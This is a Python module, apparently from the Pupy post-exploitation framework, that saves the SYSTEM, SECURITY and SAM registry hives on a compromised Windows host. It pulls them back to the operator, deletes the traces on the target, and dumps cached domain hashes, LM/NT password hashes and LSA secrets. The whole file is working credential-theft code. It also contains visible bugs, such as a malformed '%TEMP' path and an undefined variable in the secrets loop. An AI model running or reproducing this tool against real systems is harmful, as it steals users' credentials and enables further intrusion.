# -*- coding: UTF8 -*-

# Author: DeveloppSoft - developpsoft.github.io

# Changelogs:
# 26 May 2016
#  init (not working, 'System' process block the download of the hives...
#
# 28 May 2016
#  save the hives with 'reg save' before downloading

# TODO
# saves the hives with a random name
# do not write the saves on the target

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *

from modules.lib.utils.shell_exec import shell_exec

from rpyc.utils.classic import download

import os
import os.path

# CredDump imports
from pupylib.creddump.win32.domcachedump import dump_hashes
from pupylib.creddump.addrspace import HiveFileAddressSpace
from pupylib.creddump.win32.hashdump import get_bootkey, get_hbootkey
from pupylib.creddump.win32.hashdump import get_user_hashes, get_user_keys, get_user_name
from pupylib.creddump.win32.hashdump import empty_lm, empty_nt
from pupylib.creddump.win32.lsasecrets import get_file_secrets

__class_name__="CredDump"

@config(cat="gather", compatibilities=["windows"], tags=['creds',
	'credentials', 'password', 'gather', 'hives'])
class CredDump(PupyModule):
	
	""" download the hives from a remote windows system and dump creds"""
	
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='hive', description=self.__doc__)
		self.arg_parser.add_argument('--vista', action='store_true',
			dest='vista', help='is the session a Vista/7 system?')
	
	def run(self, args):
		# First, we download the hives...
		rep=os.path.join("data","downloads",self.client.short_name(),"hives")
		try:
			os.makedirs(rep)
		except Exception:
			pass
		
		self.info("saving SYSTEM hives in %TEMP%...")
		for cmd in ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM", "reg save HKLM\\SECURITY %TEMP/SECURITY", "reg save HKLM\\SAM %TEMP%/SAM"):
			self.info("running %s..." % cmd)
			self.log(shell_exec(self.client, cmd))
		self.success("hives aved!")			
		
		self.info("downloading SYSTEM hive...")
		download(self.client.conn, "%TEMP%/SYSTEM", os.path.join(rep, "SYSTEM"))
		
		self.info("downloading SECURITY hive...")
		download(self.client.conn, "%TEMP%/SECURITY", os.path.join(rep, "SECURITY"))
		
		self.info("downloading SAM hive...")
		download(self.client.conn, "%TEMP%/SAM", os.path.join(rep, "SAM"))
		
		self.success("hives downloaded to %s" % rep)
		
		# Cleanup
		self.info("cleaning up saves...")
		self.client.modules.os.remove("%TEMP%/SYSTEM")
		self.client.modules.os.remove("%TEMP%/SECURITY")
		self.client.modules.os.remove("%TEMP%/SAM")
		self.success("saves deleted")
		
		# Time to run creddump!
		# HiveFileAddressSpace - Volatilty
		sysaddr = HiveFileAddressSpace(os.path.join(rep, "SYSTEM"))
		secaddr = HiveFileAddressSpace(os.path.join(rep, "SECURITY"))
		samaddr = HiveFileAddressSpace(os.path.join(rep, "SAM"))
		
		self.info("dumping cached domain passwords...")
		# Print the results
		for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, args.vista):
			self.log("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
				d.lower(), dn.lower()))
		
		self.info("dumping LM and NT hashes...")
		bootkey = get_bootkey(sysaddr)
		hbootkey = get_hbootkey(samaddr,bootkey)
		for user in get_user_keys(samaddr):
			lmhash, nthash = get_user_hashes(user,hbootkey)
			if not lmhash: lmhash = empty_lm
			if not nthash: nthash = empty_nt
			self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16),
				lmhash.encode('hex'), nthash.encode('hex')))
		
		self.info("dumping lsa secrets...")
		secrets = get_file_secrets(os.path.join(rep, "SYSTEM"),
			os.path.join(rep, "SECURITY"), args.vista)
		if not secrets:
			self.error("unable to read LSA secrets, perhaps the hives are corrupted")
			return
		for key in secrets:
			self.log(key)
			self.dump(secrets(k), length=16)
		
		# The End! (hurrah)
		self.success("dump was successfull!")
		
	def dump(self, src, length=8):
		FILTER = ''.join([(len(repr(chr(x))) == 3 ) and chr(x) or '.' for x in range(256)])
		N = 0
		result = ''
		while src:
			s, src = src[:length], src[length:]
			hexa = ' '.join(["%02X" % ord(x) for x in s])
			s = s.translate(FILTER)
			result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
			N += length
		return result
